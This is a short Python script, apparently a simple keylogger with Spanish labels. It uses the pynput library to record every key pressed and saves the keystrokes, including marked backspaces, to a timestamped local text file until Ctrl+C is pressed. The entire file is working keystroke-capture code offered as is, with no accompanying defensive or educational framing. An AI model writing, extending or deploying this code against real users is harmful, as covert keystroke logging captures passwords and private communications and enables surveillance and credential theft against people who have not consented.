import datetime
from pynput.keyboard import Listener

d = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
f = open('keyFacil{}.txt'.format(d), 'w')

def key_recorder(key):
    key=str(key)

    if key == 'Key.enter':
        f.write('\n')

    elif key == 'Key.space':
        f.write(' ')

    elif key == 'Key.backspace':
        f.write('%BORRAR%')
    elif key == "'\\x03'":
        f.write('\n\nSaliendo del keylogger . . .')
        f.close()
        quit()
    else :
        f.write(key.replace("'", ""))

with Listener(on_press=key_recorder) as l:
	l.join()
    